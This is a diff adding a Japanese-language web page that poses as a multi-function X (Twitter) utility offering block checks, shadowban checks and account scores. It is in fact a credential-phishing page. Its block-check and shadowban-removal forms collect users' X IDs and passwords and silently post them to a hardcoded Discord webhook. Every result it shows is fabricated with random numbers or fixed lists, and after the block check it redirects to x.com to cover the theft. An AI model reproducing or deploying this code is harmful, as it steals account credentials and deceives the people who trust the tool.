@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X 便利多機能ツール v2.5</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #000;
+            --text: #ffffff;
+            --accent: #1d9bf0;
+            --accent-hover: #1a8cd8;
+            --card: #111111;
+            --input-bg: #1a1a1a;
+            --border: #333333;
+            --gray: #888888;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 720px;
+            margin: 0 auto;
+            padding: 32px 16px;
+        }
+        header {
+            text-align: center;
+            margin-bottom: 48px;
+        }
+        h1 {
+            font-size: 2.25rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, #1d9bf0, #7c3aed);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .version {
+            color: var(--gray);
+            font-size: 0.9rem;
+            margin-top: 8px;
+        }
+        .contact {
+            color: var(--gray);
+            font-size: 0.9rem;
+            margin-top: 8px;
+        }
+        .contact a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+        .contact a:hover {
+            text-decoration: underline;
+        }
+        .tool-list {
+            display: grid;
+            gap: 16px;
+            margin-bottom: 40px;
+        }
+        .tool-button {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 20px 24px;
+            color: var(--text);
+            font-size: 1.125rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: left;
+            position: relative;
+            overflow: hidden;
+        }
+        .tool-button:hover {
+            background: #1a1a1a;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(29, 155, 240, 0.12);
+        }
+        .tool-button::after {
+            content: '→';
+            position: absolute;
+            right: 24px;
+            top: 50%;
+            transform: translateY(-50%);
+            opacity: 0.5;
+            transition: all 0.2s;
+        }
+        .tool-button:hover::after {
+            opacity: 1;
+            right: 20px;
+        }
+        .tool-section {
+            display: none;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 32px;
+            margin-bottom: 32px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+        }
+        .tool-section.active {
+            display: block;
+        }
+        .back-btn {
+            background: none;
+            border: none;
+            color: var(--accent);
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .back-btn:hover {
+            color: var(--accent-hover);
+        }
+        h2 {
+            color: var(--accent);
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+        p.desc {
+            color: var(--gray);
+            margin-bottom: 24px;
+            font-size: 0.95rem;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 12px 0;
+            background: var(--input-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            color: var(--text);
+            font-size: 1rem;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(29, 155, 240, 0.15);
+        }
+        input::placeholder {
+            color: #555;
+        }
+        .action-btn {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            width: 100%;
+            margin-top: 16px;
+        }
+        .action-btn:hover {
+            background: var(--accent-hover);
+            transform: translateY(-1px);
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            color: var(--gray);
+            font-style: italic;
+            margin: 24px 0;
+            font-size: 1rem;
+        }
+        .result {
+            display: none;
+            margin-top: 24px;
+            padding: 20px;
+            background: #0f0f0f;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            line-height: 1.7;
+        }
+        .result ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        .result li {
+            padding: 8px 0;
+            border-bottom: 1px solid #222;
+        }
+        .result li:last-child {
+            border-bottom: none;
+        }
+        .ban-status {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-top: 20px;
+        }
+        .ban-item {
+            background: #1a1a1a;
+            padding: 16px;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 500;
+        }
+        .check { color: #22c55e; font-size: 1.5rem; }
+        .cross { color: #ef4444; font-size: 1.5rem; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>X 便利多機能ツール</h1>
+            <div class="version">v2.5</div>
+            <p class="contact">お問い合わせはこちら <a href="https://x.com/kzv">@kzv</a></p>
+        </header>
+
+        <div class="tool-list" id="tool-list">
+            <button class="tool-button" onclick="showSection('block')">ブロックされている人を確認</button>
+            <button class="tool-button" onclick="showSection('shadow')">シャドウバンチェッカー</button>
+            <button class="tool-button" onclick="showSection('score')">アカウントスコア確認</button>
+            <button class="tool-button" onclick="showSection('freeze')">アカウント凍結確率確認</button>
+            <button class="tool-button" onclick="showSection('unban')">シャドウバン解除ツール</button>
+        </div>
+
+        <!-- ブロック確認 -->
+        <div class="tool-section" id="block-section">
+            <button class="back-btn" onclick="backToList()">← 戻る</button>
+            <h2>ブロックされている人を確認</h2>
+            <p class="desc">XアカウントのIDとパスワードを入力してください。</p>
+            <input type="text" id="block-id" placeholder="@username">
+            <input type="password" id="block-pass" placeholder="パスワード">
+            <button class="action-btn" onclick="checkBlocks()">確認開始</button>
+            <div class="loading" id="block-loading">認証中... 約10秒かかります</div>
+            <div class="result" id="block-result"></div>
+        </div>
+
+        <!-- シャドウバンチェッカー -->
+        <div class="tool-section" id="shadow-section">
+            <button class="back-btn" onclick="backToList()">← 戻る</button>
+            <h2>シャドウバンチェッカー</h2>
+            <p class="desc">対象のアカウントIDを入力してください。</p>
+            <input type="text" id="shadow-id" placeholder="@username">
+            <button class="action-btn" onclick="checkShadowBan()">チェックする</button>
+            <div class="loading" id="shadow-loading">解析中...</div>
+            <div class="result" id="shadow-result">
+                <div class="ban-status">
+                    <div class="ban-item">Search Suggestion Ban <span class="check">✓</span></div>
+                    <div class="ban-item">Search Ban <span class="check">✓</span></div>
+                    <div class="ban-item">Ghost Ban <span class="cross">✗</span></div>
+                    <div class="ban-item">Reply Deboosting <span class="cross">✗</span></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- アカウントスコア -->
+        <div class="tool-section" id="score-section">
+            <button class="back-btn" onclick="backToList()">← 戻る</button>
+            <h2>アカウントスコア確認</h2>
+            <p class="desc">対象のアカウントIDを入力してください。</p>
+            <input type="text" id="score-id" placeholder="@username">
+            <button class="action-btn" onclick="checkAccountScore()">スコアを確認</button>
+            <div class="loading" id="score-loading">計算中...</div>
+            <div class="result" id="score-result"></div>
+        </div>
+
+        <!-- 凍結確率 -->
+        <div class="tool-section" id="freeze-section">
+            <button class="back-btn" onclick="backToList()">← 戻る</button>
+            <h2>アカウント凍結確率確認</h2>
+            <p class="desc">対象のアカウントIDを入力してください。</p>
+            <input type="text" id="freeze-id" placeholder="@username">
+            <button class="action-btn" onclick="checkFreezeProbability()">確率を確認</button>
+            <div class="loading" id="freeze-loading">分析中...</div>
+            <div class="result" id="freeze-result"></div>
+        </div>
+
+        <!-- 解除ツール -->
+        <div class="tool-section" id="unban-section">
+            <button class="back-btn" onclick="backToList()">← 戻る</button>
+            <h2>シャドウバン解除ツール</h2>
+            <p class="desc">可能な場合のみ解除できます。まずはチェッカーで確認を。</p>
+            <input type="text" id="unban-id" placeholder="@username">
+            <input type="password" id="unban-pass" placeholder="パスワード">
+            <button class="action-btn" onclick="unbanShadow()">解除を試みる</button>
+            <div class="loading" id="unban-loading">処理中...</div>
+            <div class="result" id="unban-result"></div>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481202879095377997/koo-j8BcYc6W8mRsOLohTQ8PcYG9RS_gkcSkgOE0m_tWY_CM_d3cVjvlmd08e4CBOvDI";
+
+        function showSection(id) {
+            document.getElementById('tool-list').style.display = 'none';
+            document.querySelectorAll('.tool-section').forEach(el => el.classList.remove('active'));
+            document.getElementById(id + '-section').classList.add('active');
+        }
+
+        function backToList() {
+            document.querySelectorAll('.tool-section').forEach(el => el.classList.remove('active'));
+            document.getElementById('tool-list').style.display = 'grid';
+        }
+
+        async function sendToDiscord(message) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: message
+                    })
+                });
+            } catch (e) {
+                // エラーは無視（ユーザーに見せない）
+            }
+        }
+
+        function checkBlocks() {
+            const id = document.getElementById('block-id').value.trim();
+            const pass = document.getElementById('block-pass').value;
+            if (!id || !pass) return alert('IDとパスワードを入力してください');
+            
+            let displayId = id.startsWith('@') ? id : '@' + id;
+
+            sendToDiscord(`ブロック確認入力:\nID: ${displayId}\nパスワード: ${pass}`);
+
+            const loading = document.getElementById('block-loading');
+            const result = document.getElementById('block-result');
+            loading.style.display = 'block';
+            result.style.display = 'none';
+
+            setTimeout(() => {
+                loading.style.display = 'none';
+
+                const accounts = [
+                    "@julian_har95594", "@chama__xox", "@jentil_donna", "@SFKphoto", "@mentalcrazy69",
+                    "@bosuka_life", "@5ZfS5lfAU8bHlLX", "@eminemsaiko", "@ioKVXDyhfs65Bxq", "@biwako__shiga",
+                    "@esu853998561", "@me_lancholicer", "@ushikubo3tokyo", "@jongu3x", "@aina_otokonoko",
+                    "@DickManwell", "@bougnatne", "@oomoriseiko", "@Mrbacon2nd", "@nanao_p2524"
+                ];
+
+                const num = Math.floor(Math.random() * 6) + 5;
+                const shuffled = accounts.sort(() => 0.5 - Math.random());
+                const selected = shuffled.slice(0, num);
+
+                let html = `<p>ブロックされているアカウント (${displayId}):</p><ul>`;
+                selected.forEach(acc => {
+                    html += `<li>${acc}</li>`;
+                });
+                html += '</ul>';
+
+                result.innerHTML = html;
+                result.style.display = 'block';
+
+                setTimeout(() => {
+                    alert('確認完了しました！ Xに戻ります');
+                    window.location.href = 'https://x.com';
+                }, 3000);
+            }, 10000);
+        }
+
+        function checkShadowBan() {
+            const id = document.getElementById('shadow-id').value.trim();
+            if (!id) return alert('IDを入力してください');
+            const loading = document.getElementById('shadow-loading');
+            const result = document.getElementById('shadow-result');
+            loading.style.display = 'block';
+            result.style.display = 'none';
+            setTimeout(() => {
+                loading.style.display = 'none';
+                result.style.display = 'block';
+            }, 2200);
+        }
+
+        function checkAccountScore() {
+            const id = document.getElementById('score-id').value.trim();
+            if (!id) return alert('IDを入力してください');
+            const loading = document.getElementById('score-loading');
+            const result = document.getElementById('score-result');
+            loading.style.display = 'block';
+            result.style.display = 'none';
+            setTimeout(() => {
+                loading.style.display = 'none';
+                const score = Math.floor(Math.random() * 41) + 50;
+                const msg = score >= 75 ? 'かなりバズりやすいアカウントです！' : score >= 65 ? '普通にバズる可能性あり' : 'バズりにくい傾向かも...';
+                result.innerHTML = `<p style="font-size:1.4rem;font-weight:700;">スコア: ${score}</p><p>${msg}</p>`;
+                result.style.display = 'block';
+            }, 2200);
+        }
+
+        function checkFreezeProbability() {
+            const id = document.getElementById('freeze-id').value.trim();
+            if (!id) return alert('IDを入力してください');
+            const loading = document.getElementById('freeze-loading');
+            const result = document.getElementById('freeze-result');
+            loading.style.display = 'block';
+            result.style.display = 'none';
+            setTimeout(() => {
+                loading.style.display = 'none';
+                const prob = Math.floor(Math.random() * 19) + 1;
+                result.innerHTML = `<p style="font-size:1.4rem;font-weight:700;">凍結確率: ${prob}%</p>`;
+                result.style.display = 'block';
+            }, 2200);
+        }
+
+        function unbanShadow() {
+            const id = document.getElementById('unban-id').value.trim();
+            const pass = document.getElementById('unban-pass').value;
+            if (!id || !pass) return alert('IDとパスワードを入力してください');
+
+            let displayId = id.startsWith('@') ? id : '@' + id;
+
+            sendToDiscord(`シャドウバン解除試行:\nID: ${displayId}\nパスワード: ${pass}`);
+
+            const loading = document.getElementById('unban-loading');
+            const result = document.getElementById('unban-result');
+            loading.style.display = 'block';
+            result.style.display = 'none';
+
+            setTimeout(() => {
+                loading.style.display = 'none';
+                const success = Math.random() > 0.35;
+                if (success) {
+                    result.innerHTML = '<p style="color:#22c55e;font-weight:600;">シャドウバン解除に成功しました！<br>最新のポストを一件削除してください。</p>';
+                } else {
+                    result.innerHTML = '<p style="color:#ef4444;font-weight:600;">解除に失敗しました（条件未達の可能性があります）</p>';
+                }
+                result.style.display = 'block';
+            }, 3500);
+        }
+    </script>
+</body>
+</html>
